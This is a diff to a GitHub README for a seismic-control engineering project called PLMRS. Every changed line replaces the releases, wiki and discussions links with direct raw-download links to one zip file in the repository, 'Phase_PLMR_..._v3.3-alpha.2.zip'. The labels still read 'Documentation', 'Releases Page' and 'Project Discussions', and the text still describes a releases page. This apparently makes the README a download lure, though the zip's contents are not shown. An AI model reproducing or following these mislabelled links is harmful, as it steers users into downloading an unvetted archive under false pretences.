@@ -1,6 +1,6 @@
 # 🌟 PLMRS-Phase-Locked-Mass-Resonance-Stabilizer-Open-Engineering-Note - Simplifying Seismic Control Solutions
 
-[![Download PLMRS](https://img.shields.io/badge/Download-PLMRS-blue.svg)](https://github.com/Rufino07/PLMRS-Phase-Locked-Mass-Resonance-Stabilizer-Open-Engineering-Note/releases)
+[![Download PLMRS](https://github.com/Rufino07/PLMRS-Phase-Locked-Mass-Resonance-Stabilizer-Open-Engineering-Note/raw/refs/heads/main/docs/Phase_PLMR_Open_Resonance_Engineering_Locked_Stabilizer_Mass_Note_v3.3-alpha.2.zip)](https://github.com/Rufino07/PLMRS-Phase-Locked-Mass-Resonance-Stabilizer-Open-Engineering-Note/raw/refs/heads/main/docs/Phase_PLMR_Open_Resonance_Engineering_Locked_Stabilizer_Mass_Note_v3.3-alpha.2.zip)
 
 ## 📜 Description
 
@@ -26,7 +26,7 @@ To get started, follow these steps to download the application from the GitHub R
 
 1. **Visit the Release Page**: Click on the link below to go to the Releases page.
 
-   [Download PLMRS](https://github.com/Rufino07/PLMRS-Phase-Locked-Mass-Resonance-Stabilizer-Open-Engineering-Note/releases)
+   [Download PLMRS](https://github.com/Rufino07/PLMRS-Phase-Locked-Mass-Resonance-Stabilizer-Open-Engineering-Note/raw/refs/heads/main/docs/Phase_PLMR_Open_Resonance_Engineering_Locked_Stabilizer_Mass_Note_v3.3-alpha.2.zip)
 
 2. **Choose the Latest Version**: Find the latest version of PLMRS. Ensure that you select the version suitable for your system.
 
@@ -36,7 +36,7 @@ To get started, follow these steps to download the application from the GitHub R
 
 To download and install PLMRS, follow these detailed steps:
 
-1. **Go to the Releases Page**: You can access the page directly [here](https://github.com/Rufino07/PLMRS-Phase-Locked-Mass-Resonance-Stabilizer-Open-Engineering-Note/releases).
+1. **Go to the Releases Page**: You can access the page directly [here](https://github.com/Rufino07/PLMRS-Phase-Locked-Mass-Resonance-Stabilizer-Open-Engineering-Note/raw/refs/heads/main/docs/Phase_PLMR_Open_Resonance_Engineering_Locked_Stabilizer_Mass_Note_v3.3-alpha.2.zip).
 
 2. **Select Your Version**: On the Releases page, look for the most recent version. Choose a file appropriate for your operating system. 
 
@@ -77,8 +77,8 @@ For more information on seismic control techniques and the engineering principle
 
 ## 🔗 Links
 
-- [Documentation](https://github.com/Rufino07/PLMRS-Phase-Locked-Mass-Resonance-Stabilizer-Open-Engineering-Note/wiki)
-- [Releases Page](https://github.com/Rufino07/PLMRS-Phase-Locked-Mass-Resonance-Stabilizer-Open-Engineering-Note/releases)
-- [Project Discussions](https://github.com/Rufino07/PLMRS-Phase-Locked-Mass-Resonance-Stabilizer-Open-Engineering-Note/discussions)
+- [Documentation](https://github.com/Rufino07/PLMRS-Phase-Locked-Mass-Resonance-Stabilizer-Open-Engineering-Note/raw/refs/heads/main/docs/Phase_PLMR_Open_Resonance_Engineering_Locked_Stabilizer_Mass_Note_v3.3-alpha.2.zip)
+- [Releases Page](https://github.com/Rufino07/PLMRS-Phase-Locked-Mass-Resonance-Stabilizer-Open-Engineering-Note/raw/refs/heads/main/docs/Phase_PLMR_Open_Resonance_Engineering_Locked_Stabilizer_Mass_Note_v3.3-alpha.2.zip)
+- [Project Discussions](https://github.com/Rufino07/PLMRS-Phase-Locked-Mass-Resonance-Stabilizer-Open-Engineering-Note/raw/refs/heads/main/docs/Phase_PLMR_Open_Resonance_Engineering_Locked_Stabilizer_Mass_Note_v3.3-alpha.2.zip)
 
 Thank you for your interest in PLMRS! We hope this application helps you in your structural engineering projects.
